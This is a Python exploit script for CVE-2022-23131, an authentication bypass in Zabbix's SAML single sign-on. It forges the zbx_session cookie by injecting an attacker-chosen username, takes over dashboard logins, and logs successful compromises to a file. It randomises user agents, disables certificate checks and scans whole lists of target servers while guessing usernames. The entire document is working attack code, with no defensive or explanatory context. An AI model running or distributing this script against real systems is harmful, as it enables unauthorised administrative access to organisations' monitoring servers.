#!/usr/bin/env python3
# Zabbix SSO Auth Bypass CVE-2022-23131

import requests
import re
import urllib.parse
import base64
import json
import sys
import argparse
import os
import sys
import random
from time import sleep
import tldextract
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


# random user agent
def get_random_ua():
    first_num = random.randint(90, 100)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)',
        '(Windows NT 10.0; WOW64)',
        '(X11; Linux x86_64)',
        '(X11; Linux i686) ',
        '(Macintosh;U; Intel Mac OS X 12_2_1;en-AU)',
        '(iPhone; U; CPU iPhone OS 15_0_1 like Mac OS X; en-SG)',
        '(Windows NT 10.0; Win64; x64; Xbox; Xbox One) ',
        '(iPad; U; CPU OS 14_5_1 like Mac OS X; en-US) ',
        '(Macintosh; Intel Mac OS X 12_0_1)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(
        first_num, third_num, fourth_num)

    random_ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return random_ua

def exp(target, username):
	headers = {"User-Agent":get_random_ua(),"Connection":"close","Accept":"*/*"}
	resp = session.get(url=target, verify=False, headers=headers)
	try:
		zbx_session = resp.cookies['zbx_session']
		url_decode_data = urllib.parse.unquote(zbx_session, encoding='utf-8')
		base64_decode_data = base64.b64decode(url_decode_data)
		decode_to_str = str(base64_decode_data, encoding='utf-8')
		to_json = json.loads(decode_to_str)
		tmp_ojb = dict(saml_data=dict(username_attribute=username), sessionid=to_json["sessionid"], sign=to_json["sign"])
		payloadJson = json.dumps(tmp_ojb)
		#print("decode_payload:", payloadJson)
		payload = urllib.parse.quote(base64.b64encode(payloadJson.encode()))
		#print("zbx_signed_session:", payload)
	except:
		print("Unable to get Cookie for "+resp.url+"\n")
		return True
	if zbx_session:
		cookies2 = {"zbx_session":payload}
		response = session.get(""+resp.url+"index_sso.php", headers=headers,cookies=cookies2,verify=False)
		if "action=dashboard" in response.text:
			login = ("Login Worked - Target: "+resp.url+" Username: "+username+"")
			text_file = open("found.txt", "a+")
			text_file.write(""+login+"\n")
			text_file.close()
			print(login)
		else:
			print("Login Failed - Target: "+resp.url+" Username: "+username+"\n")
	username = None

def get_user(target):
	ext = tldextract.extract(target)
	main_domain = ext.registered_domain
	username  = "sales@"+main_domain+""
	return username

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target", default="", required=False, help="Zabbix Server")
parser.add_argument("-u", "--username", default="fake", required=False, help="Zabbix Admin User")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")
parser.add_argument("-f", "--files", default="",required=False, help="Files of URLS of Zabbix Servers to Test")
args = parser.parse_args()
target = args.target
username = args.username
files = args.files

if len(sys.argv) < 2:
    parser.print_usage()
    sys.exit(1)

if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy

if files:
    if os.path.exists(files):
        with open(files, 'r') as f:
            for line in f:
                target = line.replace("\n", "")
                try:
                	if username == "fake":
                		username = get_user(target)
                	print("Testing URL:"+target+" Username: "+username+"")
                	exp(target, username)
                except KeyboardInterrupt:
                	print ("Ctrl-c pressed ...")
                except Exception as e:
                	print('Error: %s' % e)
                	pass
            f.close()
        
else:
	print("Testing URL:"+target+" Username: "+username+"")
	if username == "fake":
		username = get_user(target)
	exp(target, username)
